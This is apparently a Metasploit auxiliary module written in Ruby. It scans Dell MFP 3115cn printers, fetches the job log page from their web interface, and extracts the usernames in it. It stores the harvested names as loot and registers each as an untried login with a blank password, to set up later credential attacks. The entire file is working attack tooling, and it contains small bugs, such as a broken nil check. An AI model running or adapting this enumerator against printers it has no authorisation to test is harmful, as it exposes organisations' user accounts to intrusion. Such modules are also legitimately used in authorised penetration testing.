#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Dell MFP 3115n Color Job Username Enumerator',
      'Description'    => %{
        This module is used to harvests the usernames from the color job log file on a Dell MFP 3115cn.
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, 'Negotiate SSL for outgoing connections', false]),
        OptPort.new('RPORT', [ true, 'The target port where the printers web admin interface is', 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe. How long we are going to wait before we give up', 20])

      ], self.class)
  end

  def run_host(ip)
    print_status("Attempting to enumerate usernames from: #{peer}")

    users = pull_usernames
    return if users.blank?

    print_status('Finished extracting usernames')
    usernames = ''
    users.each do |user|
      usernames << user << "\n"
    end

    # Woot we got usernames so lets save them.
    print_good("Found the following users: #{users}")
    loot_name     = 'dell.mfp.usernames'
    loot_type     = 'text/plain'
    loot_filename = 'dell-usernames.text'
    loot_desc     = 'Dell MFP Username Harvester'
    p = store_loot(loot_name, loot_type, ip, usernames, loot_filename, loot_desc)
    print_status("Credentials saved in: #{p}")

    users.each do | user |
      register_creds('DELL-HTTP', ip, '80', user, '')
    end
  end

  def pull_usernames
    usernames = []

    begin
      res = send_request_cgi(
      {
        'uri'       => '/ews/job/log.htm',
        'method'    => 'GET'
      }, datastore['TIMEOUT'].to_i)
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{peer} - Connection failed.")
      return []
    end

    if res == nil?
      print_error("#{peer} - Connection failed.")
      return []
    end

    html_body = ::Nokogiri::HTML(res.body)
    record_total = html_body.xpath('/html/body/table/tr/td/table[3]/tr/td/table/td').length
    record_loop = (record_total / 10)

    i = 13
    print_status('Trying to extract usernames')
    while record_loop > 0
      tr_name = html_body.xpath("/html/body/table/tr/td/table[3]/tr/td/table/td[#{i}]").text
      usernames << tr_name.strip unless tr_name.blank?

      i += 10
      record_loop -= 1
    end
    usernames.uniq!
  end

  def register_creds(service_name, remote_host, remote_port, username, password)
    credential_data = {
      origin_type: :service,
      module_fullname: self.fullname,
      workspace_id: myworkspace.id,
      private_data: password,
      username: username,
      password: password
    }

    service_data = {
      address: remote_host,
      port: remote_port,
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end